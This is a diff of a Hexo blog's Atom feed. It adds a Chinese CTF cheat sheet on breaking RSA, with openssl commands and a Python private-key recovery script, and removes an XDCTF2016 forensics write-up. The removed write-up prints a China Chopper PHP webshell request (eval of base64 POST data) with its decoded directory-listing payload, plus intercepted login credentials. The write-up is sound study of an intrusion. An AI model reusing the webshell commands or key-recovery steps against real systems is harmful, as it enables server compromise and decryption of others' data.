@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://winter3un.github.io/"/>
-  <updated>2018-07-10T00:52:55.000Z</updated>
+  <updated>2018-07-10T00:52:01.000Z</updated>
   <id>https://winter3un.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CTF-RSA破解方式整理</title>
+    <link href="https://winter3un.github.io/2018/07/09/rsa-ctf/"/>
+    <id>https://winter3un.github.io/2018/07/09/rsa-ctf/</id>
+    <published>2018-07-10T00:51:05.000Z</published>
+    <updated>2018-07-10T00:52:01.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实对于RSA加密算法攻击的文章，互联网上已经有很多了，所以本文主要还是以整理为主，只列出每种攻击方式的攻击条件、需要的一些工具、具体操作步骤等。</p><a id="more"></a><h2 id="算法基本概念"><a href="#算法基本概念" class="headerlink" title="算法基本概念"></a>算法基本概念</h2><h3 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h3><p>RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。</p><h3 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h3><p>RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2</p><p>n=pq （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。<br>e1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)(q-1)互质；要求(e2e1)mod((p-1)(q-1))=1。<br>(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。</p><h3 id="算法公式"><a href="#算法公式" class="headerlink" title="算法公式"></a>算法公式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">假设：</div><div class="line">A:明文</div><div class="line">B:密文</div><div class="line"></div><div class="line">——用公钥加密公式——</div><div class="line">A=B^e2 mod n</div><div class="line">B=A^e1 mod n</div><div class="line"></div><div class="line">——用私钥加密公式——</div><div class="line">A=B^e1 mod n</div><div class="line">B=A^e2 mod n</div></pre></td></tr></table></figure><h2 id="openssl解析公私钥"><a href="#openssl解析公私钥" class="headerlink" title="openssl解析公私钥"></a>openssl解析公私钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">解析公钥</div><div class="line">openssl rsa -in publickey.pem -pubin -modulus -text</div><div class="line"></div><div class="line">解析私钥</div><div class="line">openssl rsa -in privatekey.pem  -modulus -text</div><div class="line"></div><div class="line">利用私钥文件，解密文件</div><div class="line">openssl rsautl -decrypt -in encrypted.message -inkey priv.key -out mess</div></pre></td></tr></table></figure><h2 id="python解密算法"><a href="#python解密算法" class="headerlink" title="python解密算法"></a>python解密算法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">n = 0xD12B639DF759A99C9ADB57500BBD635041AA70F8E73F6EA158B23B9AF575915CF68CF8E57B045BBEBCF78A9BCA72BF0E63CB6EC353D66142048CB69EB5F20CDC6BAF6C85E77E6F2AA906DC5868FCB0F0330DEB55076EDF1B226EF54926DD2AD3C943C8EB35CB8C85848E05EA8680988A182701B6A0DC54967760CAC28136AD5B3D9F1CF7952B898CFAAF863A90BFD58DF0FA3F358A7EB8BCBE1BFCF13872BBB9FCC2B330A38F3FD689467FEF22F027549F53D460E9FEBB48F1AE15F7BFBA93069641FD53C46FC971560F5955D8F6E419F5981A9BA393718D785F58659607F511F6CC4077834E059F368EB05BCA7964EA2DC8CD1B13F62A29EA244A3876FF5967</div><div class="line">p = 167343506005974003380506069679607737381940204686173214188860057004909006055220516074283090160430833007424970980655748310232878462615469792561310560310363430669700009093597847018287568821792168143170329382585883857083334915378884054389878477389765792275111293420203613159303898365894897865177093362621517279751</div><div class="line">e = 0x10001</div><div class="line">c = 0xab3a204bb5fc33764ea6452124971bba469176e2f2a8700f6e599a6da6129bd89ab6eba5ac7704a419a297b578d0dee06ec417c18c791011f9af95761d170420e5e381f939be918b8cf57104bc978760da8c73d7e8abdb16943c8cda4241b50dabc1ecb74d320d23bfeab8bd764e9b93bfaecae3746f62b56cd1b94adeac090e2a604037c496ec1c5bccaadbd4761322a8eeed3425154ca65d37b885bd226a2b6207a2c21fec5a8edb8ce41d9a478b7d6c614ee972060468691568ab3ca63aba9db9df7ebe1445fa1ec591de42dab950092bf79cc3e9682f19cc5a4c329a7c59ed6e85fd191f555199c778f8a2a3b9c9de6b1fb9ee6b9086c84a3986080963fb</div><div class="line"></div><div class="line">q = n/p</div><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">        return (b, 0, 1)</div><div class="line">    else:</div><div class="line">        g, y, x = egcd(b % a, a)</div><div class="line">        return (g, x - (b // a) * y, y)</div><div class="line"></div><div class="line">def modinv(a, m):</div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    if g != 1:</div><div class="line">        raise Exception(&apos;modular inverse does not exist&apos;)</div><div class="line">    else:</div><div class="line">        return x % m</div><div class="line"></div><div class="line">d=modinv(e,(p-1)*(q-1))</div><div class="line">m=pow(c,d,n)</div></pre></td></tr></table></figure><h2 id="ctfRSAtools"><a href="#ctfRSAtools" class="headerlink" title="ctfRSAtools"></a>ctfRSAtools</h2><p>全自动化的工具，了解一下</p><p><a href="https://github.com/Winter3un/CTF-RSA-tool" target="_blank" rel="external">https://github.com/Winter3un/CTF-RSA-tool</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://thief.one/2016/09/06/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/" target="_blank" rel="external">https://thief.one/2016/09/06/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/</a> RSA加密算法解析</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实对于RSA加密算法攻击的文章，互联网上已经有很多了，所以本文主要还是以整理为主，只列出每种攻击方式的攻击条件、需要的一些工具、具体操作步骤等。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
+    
+      <category term="crypto" scheme="https://winter3un.github.io/tags/crypto/"/>
+    
+  </entry>
   
   <entry>
     <title>2018 706 writeup</title>
@@ -492,31 +514,6 @@
       <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
     
       <category term="bctf" scheme="https://winter3un.github.io/tags/bctf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）</title>
-    <link href="https://winter3un.github.io/2016/10/05/xdctf2016-wp/"/>
-    <id>https://winter3un.github.io/2016/10/05/xdctf2016-wp/</id>
-    <published>2016-10-05T07:33:21.000Z</published>
-    <updated>2016-12-20T02:32:33.131Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目如下</p><img src="/2016/10/05/xdctf2016-wp/title.jpg" alt="title.jpg" title=""><p>下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的）</p><p>下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap<br><img src="/2016/10/05/xdctf2016-wp/sum1.png" alt="sum1.png" title=""></p> <a id="more"></a><img src="/2016/10/05/xdctf2016-wp/sum2.png" alt="sum2.png" title=""><p>使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。<br><img src="/2016/10/05/xdctf2016-wp/http.png" alt="http.png" title=""></p><p>接着使用过滤规则<code>http and ((ip.src == 219.239.105.18 and ip.dst == 172.16.61.210) or (ip.src == 172.16.61.210 and ip.dst == 219.239.105.18))</code>，仔细分析对应的HTTP攻击流量。</p><p>然而wireshark还是太麻烦了。。。 做起来太耗时间，想着能否有一个工具可以提取出pcap数据包中对应的IP的HTTP协议数据包，把heard 和 body 都提出来。</p><p>找了一下发现一个神器<a href="https://github.com/caoqianli/httpcap#usage" target="_blank" rel="external">https://github.com/caoqianli/httpcap#usage</a></p><p>安装完毕后，使用其进行数据包分析，首先提取我们迫切需要的数据。</p><p><code>parse-pcap -i 219.239.105.18 -vvv sum.pcap &gt; 1.html</code></p><p>然后使用notepad++对其进行手工分析（数据量已经很少了。</p><p>找到关键数据,用户名为root 密码为 123456  题一、题二已经解决。</p><img src="/2016/10/05/xdctf2016-wp/login.png" alt="login.png" title=""><p>发现黑客进入后台后，修改的页面为index.html，题三解决</p><img src="/2016/10/05/xdctf2016-wp/file.png" alt="file.png" title=""><p>如下图可以看到，黑客已经将一句话木马写入web服务器，且其口令为<code>chopper</code>，完整连接地址为<code>http://118.194.196.232/index.php?m=search</code>,题四、题五解决。通过查看返回包得知其执行的命令为pwd，查看当前目录绝对路径的命令。</p><img src="/2016/10/05/xdctf2016-wp/muma.png" alt="muma.png" title=""><p>继续往下分析。发现其查看了目录文件，继而返回去分析其命令。</p><img src="/2016/10/05/xdctf2016-wp/muma2.png" alt="muma2.png" title=""><p><code>chopper=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8%3D</code></p><p>url解码</p><p><code>chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8=</code></p><p>z0为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(Ii0 |&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;</div><div class="line">&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();</div></pre></td></tr></table></figure></p><p>z1为<br><code>/var/www/html/</code></p><p>可知其查看的第一个文件目录为<code>/var/www/html</code>，第六个问题解决。</p><p>发现数据还没查看玩，继续拉下去分析。。。。竟然发现了sqlmap跑包的数据，特么一句话都有了，还搞sqlmap干啥？？？ - -。。。</p><p>如下图，大量对<code>http://118.194.196.232:8090/webmail/userapply.php?execadd=111&amp;DomainID=111</code>的<code>Domain</code>参数进行sql注入尝试的http数据包。然而并没有什么软用<br><img src="/2016/10/05/xdctf2016-wp/sqlmap.png" alt="sqlmap.png" title=""></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h3&gt;&lt;p&gt;题目如下&lt;/p&gt;
-&lt;img src=&quot;/2016/10/05/xdctf2016-wp/title.jpg&quot; alt=&quot;title.jpg&quot; title=&quot;&quot;&gt;
-&lt;p&gt;下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的）&lt;/p&gt;
-&lt;p&gt;下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap&lt;br&gt;&lt;img src=&quot;/2016/10/05/xdctf2016-wp/sum1.png&quot; alt=&quot;sum1.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
-    
-      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
     
   </entry>
   
